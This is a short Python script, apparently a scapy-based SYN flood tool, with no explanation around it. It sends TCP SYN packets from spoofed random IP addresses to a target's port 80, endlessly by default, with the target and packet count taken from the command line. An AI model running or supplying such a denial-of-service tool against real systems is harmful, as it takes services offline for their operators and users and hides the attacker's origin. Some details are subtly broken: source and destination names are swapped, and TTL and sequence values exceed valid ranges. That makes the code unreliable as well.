from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal
import random

RHOST = RandIP()
RPORT = 80
SHOST = '192.168.1.101' #randomize
SPORT = -1 #randomize
NUMSYN = -1 #infinite
ISINFINITE = False

if len(sys.argv) > 3:
	SHOST = sys.argv[1]
	SPORT = sys.argv[2]
	NUMSYN = int(sys.argv[3])
	
if SPORT is -1:
	SPORT = RandShort()
	
if SHOST is -1:
	SHOST = RandIP()
	
if NUMSYN is -1:
	ISINFINITE = True
	
while ISINFINITE or NUMSYN > 0:
	ip = IP(src=RHOST, dst=SHOST, ttl=random.randint(128, 256))
	tcp = TCP(flags="S", sport=SPORT, dport=RPORT, window=random.randint(1, 4096),seq=random.randint(0, 4294967296))
	sendp(Ether()/ip/tcp, verbose = False)
	NUMSYN -= 1

